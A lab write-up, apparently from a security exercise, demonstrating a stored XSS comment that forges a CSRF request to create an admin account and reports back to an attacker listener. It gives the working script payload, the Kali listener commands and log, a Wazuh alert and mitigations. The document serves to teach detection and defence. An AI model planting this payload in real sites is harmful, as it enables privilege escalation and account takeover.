# 02 — Stored XSS and CSRF

## Objective

Demonstrate how stored XSS can execute in an administrator's browser and perform a forged administrative request when CSRF protection is missing.

## Commands and payload

First we need to listen to the port 8000 on the kali linux with this command:

```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We then type our comment followed by this script
```html
<script>
fetch('/admin/create_user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacker&password=ChangeMe123!&role=admin'
}).then(r => fetch('http://10.10.10.10:8000/log?status=' + r.status));
</script>
```

## Execution and expected result

When an administrator opens the page containing the stored comment, the script runs in the administrator's session. The forged request creates an account without an explicit action from the administrator.

![](/docs/images/xss.png)

The full comment is:
```
Nice shoes ! <script>
fetch('/admin/create_user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacker&password=ChangeMe123!&role=admin'
}).then(r => fetch('http://10.10.10.10:8000/log?status=' + r.status));
</script>
```
```
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.10 - - [14/Oct/2026 18:15:58] code 404, message File not found
10.10.10.10 - - [14/Oct/2026 18:15:58] "GET /log?status=200 HTTP/1.1" 404 -
```
As we can see the attacker knows when the account is created just by looking at the status value which is `200` meaning our privileged account was successfully created.
## Wazuh view
```json
{
  "ip": "192.168.1.2",
  "name": "ubuntu-server",
  "srcip": "10.10.10.10",
  "dstuser": "hacker",
  "description": "New user added to the system.",
  "mitre": "T1136 - Create Account (Persistence)"   
}
```
## Mitigation

- Escape untrusted output.
```python
 database.execute(
    """
    INSERT INTO review (product_id, author_id, rating, body)
    VALUES (?, ?, ?, ?)
    """,
    (product_id, author["id"], rating, escape(body)),
)
```
- Add server-side CSRF protection with `Flask-WTF` or an equivalent mechanism.
- Validate authorization and role changes on the server; never trust a client-submitted role.